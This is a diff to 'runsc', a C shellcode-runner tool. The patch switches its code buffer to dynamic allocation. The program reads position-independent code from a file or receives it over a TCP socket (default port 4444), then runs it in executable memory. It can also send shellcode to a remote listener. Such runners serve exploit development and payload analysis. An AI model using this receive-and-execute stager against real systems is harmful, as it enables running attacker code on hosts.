@@ -1,6 +1,6 @@
 
 /**
-  Copyright © 2016-2017 Odzhan. All Rights Reserved.
+  Copyright © 2016-2019 Odzhan. All Rights Reserved.
 
   Redistribution and use in source and binary forms, with or without
   modification, are permitted provided that the following conditions are
@@ -72,7 +72,6 @@
 #define RSC_SEND   0
 #define RSC_RECV   1
 
-#define MAX_BUFSIZ   16384*128
 #define DEFAULT_PORT "4444"
 
 // structure for parameters
@@ -88,7 +87,7 @@ typedef struct _args_t {
   struct   sockaddr_in6 v6;
   char     ip[INET6_ADDRSTRLEN];
   uint32_t code_len;
-  uint8_t  code[MAX_BUFSIZ];
+  void     *code;
 } args_t;
 
 #ifdef WIN
@@ -237,13 +236,15 @@ void xcode(args_t *p)
   int  i;
   int  fd[2048];
   
-  if (p->code_len==0) return;
-  
+  if (p->code_len == 0) {
+    printf("[ no code to execute.\n");
+    return;
+  }
   printf ("[ executing code...\n");
     
 #ifdef WIN
   bin=VirtualAlloc (0, p->code_len, 
-    MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 #else
   bin=mmap (0, p->code_len, 
     PROT_EXEC | PROT_WRITE | PROT_READ, 
@@ -290,161 +291,203 @@ void xcode(args_t *p)
       #endif
     }
 #ifdef WIN
-    VirtualFree (bin, p->code_len, MEM_RELEASE);
+    VirtualFree (bin, 0, MEM_RELEASE | MEM_DECOMMIT);
 #else
     munmap (bin, p->code_len);
 #endif
   }
 }
 
-void send_data(args_t *p, int s)
-{
-  FILE     *fd;
-  int      outlen, len, opt;
-  uint32_t sum;
-  uint8_t  buf[BUFSIZ];
-      
-  // open file for read in binary mode
-  printf ("[ opening %s for read\n", p->file);
-  fd=fopen(p->file, "rb");
-  if (fd!=0)
-  {
-    // send contents of file
-    printf ("[ sending data\n");
-    for (;;)
+void send_data(args_t *p, int s) {
+    FILE     *fd;
+    int      outlen, len, opt;
+    uint32_t sum;
+    uint8_t  buf[BUFSIZ];
+        
+    // open file for read in binary mode
+    printf ("[ opening %s for read\n", p->file);
+    fd = fopen(p->file, "rb");
+    
+    if (fd != NULL)
     {
-      // read block
-      outlen=fread(buf, sizeof(uint8_t), BUFSIZ, fd);
-      // zero or less indicates EOF
-      if (outlen<=0) break;
-      // send contents
-      for (sum=0; sum<outlen; sum += len) {
-        len=send (s, &buf[sum], outlen - sum, 0);
-        if (len<=0) break;
+      // send contents of file
+      printf ("[ sending data\n");
+      for (;;) {
+        // read block
+        outlen = fread(buf, sizeof(uint8_t), BUFSIZ, fd);
+        // zero or less indicates EOF
+        if (outlen <= 0) break;
+        // send contents
+        for (sum=0; sum<outlen; sum += len) {
+          len=send (s, &buf[sum], outlen - sum, 0);
+          if (len <= 0) break;
+        }
+        p->code_len += sum;
+        if (outlen != sum) break;
       }
-      p->code_len += sum;
-      if (outlen!=sum) break;
+      printf ("[ sent %i bytes\n", p->code_len);
+      fclose(fd);
     }
-    printf ("[ sent %i bytes\n", p->code_len);
-    fclose(fd);
-  }
 }
 
-void recv_data(args_t *p, int s)
-{
-  int            opt, r;
-  fd_set         fds;
-  struct timeval tv;
-  
-  p->code_len=0;
- 
-  // set to non-blocking mode
-  #ifdef WIN
-    opt=1;
-    ioctlsocket (s, FIONBIO, (u_long*)&opt);
-  #else
-    opt=fcntl(s, F_GETFL, 0);
-    fcntl(s, F_SETFL, opt | O_NONBLOCK);
-  #endif
-  // keep reading until remote disconnects or we
-  // exceed our max buffer size
-  printf ("[ receiving data\n");
-  for (;;)
-  {
-    FD_ZERO(&fds);
-    FD_SET(s, &fds);
-  
-    tv.tv_sec  = 5;
-    tv.tv_usec = 0;
-    r=select(FD_SETSIZE, &fds, 0, 0, &tv);
+void recv_data(args_t *p, int s) {
+    int            opt, r;
+    fd_set         fds;
+    struct timeval tv;
+    void           *pv;
     
-    if (r<=0) {
-      printf ("[ waiting for data timed out or failed\n");
-      break;
+    p->code_len = 0;
+    p->code     = malloc(BUFSIZ);
+   
+    // set to non-blocking mode
+    #ifdef WIN
+      opt=1;
+      ioctlsocket (s, FIONBIO, (u_long*)&opt);
+    #else
+      opt=fcntl(s, F_GETFL, 0);
+      fcntl(s, F_SETFL, opt | O_NONBLOCK);
+    #endif
+    // keep reading until remote disconnects or we run out of memory
+    printf ("[ receiving data\n");
+    
+    for (;;) {
+      FD_ZERO(&fds);
+      FD_SET(s, &fds);
+    
+      tv.tv_sec  = 5;
+      tv.tv_usec = 0;
+      r = select(FD_SETSIZE, &fds, 0, 0, &tv);
+      
+      if (r <= 0) {
+        printf ("[ waiting for data timed out or failed\n");
+        break;
+      }
+      // receive a block
+      r = recv(s, (uint8_t*)p->code + p->code_len, BUFSIZ, 0);
+      if (r <= 0) break;
+      p->code_len += r;
+      // resize buffer
+      pv = realloc(p->code, p->code_len + BUFSIZ);
+      // on error, free pointer
+      if(pv == NULL) {
+        p->code_len = 0;
+        free(p->code);
+        p->code = NULL;
+        printf("[ error: out of memory.\n");
+        break;
+      }
+      p->code = pv;
     }
-    // too much data?
-    if ((p->code_len+BUFSIZ) > MAX_BUFSIZ) {
-      printf ("[ too much incoming data %i\n", p->code_len);
-      p->code_len=0;
-      break;
+    if(p->code_len != 0) {
+      printf ("[ received %i bytes\n", p->code_len);
     }
-    // receive a block
-    r=recv(s, &p->code[p->code_len], BUFSIZ, 0);
-    if (r<=0) break;
-    p->code_len += r;
-  }
-  printf ("[ received %i bytes\n", p->code_len);
 }
 
 // 
 int ssr (args_t *p)
 /**
- * PURPOSE : send or receive data as server
+ * PURPOSE : send a shellcode or receive one from remote system and execute it
  *
- * RETURN :  Nothing
+ * RETURN :  0 or length of shellcode sent/received
  *
  * NOTES :   None
  *
  *F*/
 {
-  int             s, opt, r, t;
-  fd_set          fds;
-  struct timeval  tv;
-  
-  p->code_len=0;
-  
-  // create socket
-  printf ("[ creating socket\n");
-  s=socket(p->ai_family, SOCK_STREAM, IPPROTO_TCP);
-  if (s<0) return 0;
-      
-  // ensure we can reuse socket
-  t=1;
-  setsockopt (s, SOL_SOCKET, SO_REUSEADDR, (char*)&t, sizeof (t));
-  
-  // bind to port
-  printf ("[ binding to port %s\n", p->port);
-  r=bind(s, p->ai_addr, p->ai_addrlen);
-  if (r==0)
-  {
-    // listen
-    r=listen (s, 1);
-    if (r==0)
-    {
-      printf ("[ waiting for connections on %s\n", addr2ip(p));
-      if (r==0)
-      {
-        t=accept(s, p->ai_addr, &p->ai_addrlen);
-        printf ("[ accepting connection from %s\n", addr2ip(p));
-        if (t>0)
-        {
-          if (p->tx_mode==RSC_SEND) {
-            send_data(p, t);
-          } else {
-            recv_data(p, t);
-            xcode(p);
+    int             s, opt, r, t;
+    fd_set          fds;
+    struct timeval  tv;
+    
+    p->code_len=0;
+    
+    // create socket
+    printf ("[ creating socket\n");
+    s = socket(p->ai_family, SOCK_STREAM, IPPROTO_TCP);
+    if (s < 0) return 0;
+        
+    // ensure we can reuse socket
+    t=1;
+    setsockopt (s, SOL_SOCKET, SO_REUSEADDR, (char*)&t, sizeof (t));
+    
+    // bind to port
+    printf ("[ binding to port %s\n", p->port);
+    r = bind(s, p->ai_addr, p->ai_addrlen);
+    if (r == 0) {
+      // listen
+      r = listen (s, 1);
+      if (r == 0) {
+        printf ("[ waiting for connections on %s\n", addr2ip(p));
+        if (r == 0) {
+          t = accept(s, p->ai_addr, &p->ai_addrlen);
+          printf ("[ accepting connection from %s\n", addr2ip(p));
+          if (t > 0) {
+            if (p->tx_mode == RSC_SEND) {
+              send_data(p, t);
+            } else {
+              recv_data(p, t);
+              xcode(p);
+            }
           }
         }
+        // close socket to peer
+        shutdown(t, SHUT_RDWR);
+        close(t);
+      } else {
+        perror("listen");
       }
-      // close socket to peer
-      shutdown(t, SHUT_RDWR);
-      close(t);
     } else {
-      perror("listen");
+      perror("bind");
     }
-  } else {
-    perror("bind");
-  }
-  // close listening socket
-  shutdown(s, SHUT_RDWR);
-  close(s);
-  return p->code_len;
+    // close listening socket
+    shutdown(s, SHUT_RDWR);
+    close(s);
+    
+    return p->code_len;
 }
 
 /**F*****************************************************************/
 int csr (args_t *p)
 /**
- * PURPOSE : send or receive data as client
+ * PURPOSE : opens connection to remote system and sends shellcode
+ *
+ * RETURN :  0 or 1
+ *
+ * NOTES :   None
+ *
+ *F*/
+{
+    int            s, r, opt;
+    fd_set         fds;
+    struct timeval tv;
+    
+    printf ("[ creating socket\n");
+    s = socket(p->ai_family, SOCK_STREAM, IPPROTO_TCP);
+    if (s < 0) return 0;
+    
+    // try connect to remote
+    printf ("[ connecting to %s\n", addr2ip(p));
+    r = connect(s, p->ai_addr, p->ai_addrlen);
+    
+    if (r == 0) {
+      if (p->tx_mode==RSC_SEND) {
+        send_data(p, s);
+      } else {
+        recv_data(p, s);
+        xcode(p);
+      }
+    } else {
+      xstrerror("connect");
+    }
+    printf ("[ closing connection\n");
+    shutdown(s, SHUT_RDWR);
+    close(s);
+    return 1;
+}
+
+/**F*****************************************************************/
+void xfile(args_t *p)
+/**
+ * PURPOSE : read contents of shellcode and attempt to execute it locally
  *
  * RETURN :  Nothing
  *
@@ -452,262 +495,240 @@ int csr (args_t *p)
  *
  *F*/
 {
-  int            s, r, opt;
-  fd_set         fds;
-  struct timeval tv;
-  
-  printf ("[ creating socket\n");
-  s=socket(p->ai_family, SOCK_STREAM, IPPROTO_TCP);
-  if (s<0) return 0;
-  
-  // try connect to remote
-  printf ("[ connecting to %s\n", addr2ip(p));
-  r=connect(s, p->ai_addr, p->ai_addrlen);
-  if (r==0)
-  {
-    if (p->tx_mode==RSC_SEND) {
-      send_data(p, s);
-    } else {
-      recv_data(p, s);
+    FILE    *fd;
+    int     len;
+    void    *pv;
+    
+    p->code_len = 0;
+    p->code     = NULL;
+    
+    printf ("[ reading code from %s\n", p->file);
+    fd = fopen(p->file, "rb");
+    
+    if (fd == NULL) {
+      xstrerror("fopen(\"%s\")", p->file);
+      return;
+    }
+    // read contents of file
+    for (;;) {
+      // first loop? allocate block
+      if(p->code == NULL) {
+        p->code = malloc(BUFSIZ);
+      }
+      // read a block of data
+      len = fread((uint8_t*)p->code + p->code_len, sizeof(uint8_t), BUFSIZ, fd);
+      if (len <= 0) break;
+      p->code_len += len;
+      // resize buffer for next read
+      pv = realloc(p->code, p->code_len + BUFSIZ);
+      
+      if(pv == NULL) {
+        p->code_len = 0;
+        free(p->code);
+        p->code = NULL;
+        printf("[ error: out of memory!.\n");
+        break;
+      }
+      p->code = pv;
+    }
+    fclose(fd);
+    
+    if(p->code_len != 0) {
       xcode(p);
     }
-  } else {
-    xstrerror("connect");
-  }
-  printf ("[ closing connection\n");
-  shutdown(s, SHUT_RDWR);
-  close(s);
-  return 1;
-}
-
-void xfile(args_t *p)
-{
-  FILE *fd;
-  int  len;
-  
-  p->code_len=0;
-  
-  printf ("[ reading code from %s\n", p->file);
-  fd=fopen(p->file, "rb");
-  if (fd==0) {
-    xstrerror("fopen(\"%s\")", p->file);
-    return;
-  }
-  // read contents of file
-  for (;;)
-  {
-    if ((p->code_len+BUFSIZ) > MAX_BUFSIZ) {
-      printf ("[ file too big for buffer, increase MAX_BUFSIZ");
-      p->code_len=0;
-      break;
-    }
-    len=fread(&p->code[p->code_len], sizeof(uint8_t), BUFSIZ, fd);
-    if (len<=0) break;
-    p->code_len += len;
-  }
-  fclose(fd);
-  xcode(p);
 }
 
 #ifdef WIN
-void load_modules(char *names)
-{
-  HMODULE mod;
-  char *p = strtok(names, ";,");
-  
-  while (p != NULL)
-  {
-    printf ("[ loading %s...", p);
-    mod = LoadLibrary(p);
+void load_modules(char *names) {
+    HMODULE mod;
+    char *p = strtok(names, ";,");
     
-    printf ("%s\n", mod==NULL ? "FAILED" : "OK");
-    
-    p = strtok(NULL, ";,");
-  }
+    while (p != NULL) {
+      printf ("[ loading %s...", p);
+      mod = LoadLibrary(p);
+      
+      printf ("%s\n", mod==NULL ? "FAILED" : "OK");
+      
+      p = strtok(NULL, ";,");
+    }
 }
 #endif
 
 /**F*****************************************************************/
-void usage (void) 
-{
-  printf ("\n  usage: runsc <address> [options]\n");
-  printf ("\n  -4            Use IP version 4 (default)");
-  printf ("\n  -6            Use IP version 6");
-  printf ("\n  -l            Listen mode (required when listening on specific interface)");
-  #ifdef WIN
-  printf ("\n  -m <dll>      Loads DLL modules. Each one separated by comma or semi-colon");
-  #endif
-  printf ("\n  -f <file>     Read PIC from <file>");
-  printf ("\n  -s <count>    Simulate real process by creating file descriptors");
-  printf ("\n  -p <number>   Port number to use (default is %s)", DEFAULT_PORT);
-  printf ("\n  -x            Execute PIC (requires -f)");
-  printf ("\n\n  Press any key to continue . . .");
-  getchar ();
-  exit (0);
+void usage (void) {
+    printf ("\n  usage: runsc <address> [options]\n");
+    printf ("\n  -4            Use IP version 4 (default)");
+    printf ("\n  -6            Use IP version 6");
+    printf ("\n  -l            Listen mode (required when listening on specific interface)");
+    #ifdef WIN
+    printf ("\n  -m <dll>      Loads DLL modules. Each one separated by comma or semi-colon");
+    #endif
+    printf ("\n  -f <file>     Read PIC from <file>");
+    printf ("\n  -s <count>    Simulate real process by creating file descriptors");
+    printf ("\n  -p <number>   Port number to use (default is %s)", DEFAULT_PORT);
+    printf ("\n  -x            Execute PIC (requires -f)");
+    printf ("\n\n  Press any key to continue . . .");
+    getchar ();
+    
+    exit (0);
 }
 
 /**F*****************************************************************/
-char* getparam (int argc, char *argv[], int *i)
-{
-  int n=*i;
-  if (argv[n][2] != 0) {
-    return &argv[n][2];
-  }
-  if ((n+1) < argc) {
-    *i=n+1;
-    return argv[n+1];
-  }
-  printf ("[ %c%c requires parameter\n", argv[n][0], argv[n][1]);
-  exit (0);
-}
-
-void parse_args (args_t *p, int argc, char *argv[])
-{
-  int  i;
-  char opt;
-
-  // for each argument
-  for (i=1; i<argc; i++)
-  {
-    // is this option?
-    if (argv[i][0]=='-' || argv[i][1]=='/')
-    {
-      // get option value
-      opt=argv[i][1];
-      switch (opt)
-      {
-        case '4':
-          p->ai_family=AF_INET;
-          break;
-        case '6':     // use ipv6 (default is ipv4)
-          p->ai_family=AF_INET6;
-          break;
-        case 'x':     // execute PIC, requires -f
-          p->mode=RSC_EXEC;
-          break;
-        case 'd':     // debug the code
-          p->dbg=1;
-          break;
-        case 'f':     // file
-          p->file=getparam(argc, argv, &i);
-          break;
-        case 'l':     // listen for incoming connections
-          p->mode=RSC_SERVER;
-          break;
-        #ifdef WIN  
-        case 'm':     // windows only, loads modules required by shellcode
-          p->modules = getparam(argc, argv, &i);
-          break;
-        #endif          
-        case 's':     // create file descriptors before execution
-          p->sim=atoi(getparam(argc, argv, &i));
-          break;
-        case 'p':     // port number
-          p->port=getparam(argc, argv, &i);
-          p->port_nbr=atoi(p->port);
-          break;
-        case '?':     // display usage
-        case 'h':
-          usage ();
-          break;
-        default:
-          printf ("[ unknown option %c\n", opt);
-          usage();
-          break;
-      }
-    } else {
-      // assume it's hostname or ip
-      p->address=argv[i];
-      p->mode=RSC_CLIENT;
+char* getparam (int argc, char *argv[], int *i) {
+    int n=*i;
+    if (argv[n][2] != 0) {
+      return &argv[n][2];
     }
-  }
+    if ((n+1) < argc) {
+      *i=n+1;
+      return argv[n+1];
+    }
+    printf ("[ %c%c requires parameter\n", argv[n][0], argv[n][1]);
+    exit (0);
 }
 
-int main (int argc, char *argv[])
-{
-  args_t args;
-  struct stat st;
-  
-  #ifdef WIN
-  // 
-  PVOID   OldValue=NULL;
-  WSADATA wsa;
-  
-  //Wow64DisableWow64FsRedirection (&OldValue);
-  LoadLibrary("ws2_32");
-  LoadLibrary("advapi32");
-  
-  WSAStartup(MAKEWORD(2,0), &wsa);
-  #endif
-  
-  setbuf(stdout, NULL);
-  setbuf(stderr, NULL);
-  
-  memset (&args, 0, sizeof(args));
-  
-  // set default parameters
-  args.address   = NULL;
-  args.file      = NULL;
-  args.ai_family = AF_INET;
-  args.port      = DEFAULT_PORT;
-  args.port_nbr  = atoi(args.port);
-  args.mode      = -1;
-  args.tx_mode   = -1;
-  args.sim       = 0;
-  args.dbg       = 0;
-  
-  printf ("\n[ run shellcode v0.1\n");
-  
-  parse_args(&args, argc, argv);
-  
-  // check if we have file parameter and it accessible
-  if (args.file!=NULL) {
-    if (stat (args.file, &st)) {
-      printf ("[ unable to access %s\n", args.file);
-      return 0;
-    } else {
-      if (st.st_size > MAX_BUFSIZ) {
-        printf ("[ %s exceeds MAX_BUFSIZ of %i bytes\n", args.file, MAX_BUFSIZ);
+void parse_args (args_t *p, int argc, char *argv[]) {
+    int  i;
+    char opt;
+
+    // for each argument
+    for (i=1; i<argc; i++)
+    {
+      // is this option?
+      if (argv[i][0]=='-' || argv[i][1]=='/')
+      {
+        // get option value
+        opt=argv[i][1];
+        switch (opt)
+        {
+          case '4':
+            p->ai_family=AF_INET;
+            break;
+          case '6':     // use ipv6 (default is ipv4)
+            p->ai_family=AF_INET6;
+            break;
+          case 'x':     // execute PIC, requires -f
+            p->mode=RSC_EXEC;
+            break;
+          case 'd':     // debug the code
+            p->dbg=1;
+            break;
+          case 'f':     // file
+            p->file=getparam(argc, argv, &i);
+            break;
+          case 'l':     // listen for incoming connections
+            p->mode=RSC_SERVER;
+            break;
+          #ifdef WIN  
+          case 'm':     // windows only, loads modules required by shellcode
+            p->modules = getparam(argc, argv, &i);
+            break;
+          #endif          
+          case 's':     // create file descriptors before execution
+            p->sim=atoi(getparam(argc, argv, &i));
+            break;
+          case 'p':     // port number
+            p->port=getparam(argc, argv, &i);
+            p->port_nbr=atoi(p->port);
+            break;
+          case '?':     // display usage
+          case 'h':
+            usage ();
+            break;
+          default:
+            printf ("[ unknown option %c\n", opt);
+            usage();
+            break;
+        }
+      } else {
+        // assume it's hostname or ip
+        p->address=argv[i];
+        p->mode=RSC_CLIENT;
+      }
+    }
+}
+
+int main (int argc, char *argv[]) {
+    args_t args;
+    struct stat st;
+    
+    #ifdef WIN
+      // 
+      PVOID   OldValue=NULL;
+      WSADATA wsa;
+      
+      //Wow64DisableWow64FsRedirection (&OldValue);
+      LoadLibrary("ws2_32");
+      LoadLibrary("advapi32");
+      
+      WSAStartup(MAKEWORD(2,0), &wsa);
+    #endif
+    
+    setbuf(stdout, NULL);
+    setbuf(stderr, NULL);
+    
+    memset (&args, 0, sizeof(args));
+    
+    // set default parameters
+    args.address   = NULL;
+    args.file      = NULL;
+    args.ai_family = AF_INET;
+    args.port      = DEFAULT_PORT;
+    args.port_nbr  = atoi(args.port);
+    args.mode      = -1;
+    args.tx_mode   = -1;
+    args.sim       = 0;
+    args.dbg       = 0;
+    
+    printf ("\n[ run shellcode v0.2\n");
+    
+    parse_args(&args, argc, argv);
+    
+    // check if we have file parameter and it accessible
+    if (args.file!=NULL) {
+      if (stat (args.file, &st)) {
+        printf ("[ unable to access %s\n", args.file);
         return 0;
       }
     }
-  }
-  
-  #ifdef WIN
-  if (args.modules != NULL) {
-    load_modules(args.modules);
-  }
-  #endif
-  // if mode is executing
-  if (args.mode==RSC_EXEC) {
-    if (args.file!=NULL) {
-      xfile(&args);
-      return 0;
-    } else {
-      printf ("\n[ you've used -x without supplying file with -f");
-      return 0;
-    }
-  }
-  if (init_network(&args))
-  {
-    // if no file specified, we receive and execute data
-    args.tx_mode = (args.file==NULL) ? RSC_RECV : RSC_SEND;
     
-    // if mode is -1, we listen for incoming connections
-    if (args.mode == -1) {
-      args.mode=RSC_SERVER;
+    #ifdef WIN
+    if (args.modules != NULL) {
+      load_modules(args.modules);
     }
-    
-    // if no file specified, set to receive one
-    if (args.tx_mode == -1) {
-      args.tx_mode=RSC_RECV;
+    #endif
+    // if mode is executing
+    if (args.mode == RSC_EXEC) {
+      if (args.file != NULL) {
+        xfile(&args);
+        return 0;
+      } else {
+        printf ("\n[ you've used -x without supplying file with -f");
+        return 0;
+      }
     }
-    
-    if (args.mode==RSC_SERVER) {
-      ssr (&args);
-    } else {
-      csr (&args);
+    if (init_network(&args)) {
+      // if no file specified, we receive and execute data
+      args.tx_mode = (args.file==NULL) ? RSC_RECV : RSC_SEND;
+      
+      // if mode is -1, we listen for incoming connections
+      if (args.mode == -1) {
+        args.mode=RSC_SERVER;
+      }
+      
+      // if no file specified, set to receive one
+      if (args.tx_mode == -1) {
+        args.tx_mode = RSC_RECV;
+      }
+      
+      if (args.mode == RSC_SERVER) {
+        ssr (&args);
+      } else {
+        csr (&args);
+      }
     }
-  }
-  return 0;
+    if(args.code_len != 0) {
+      free(args.code);
+    }
+    return 0;
 }
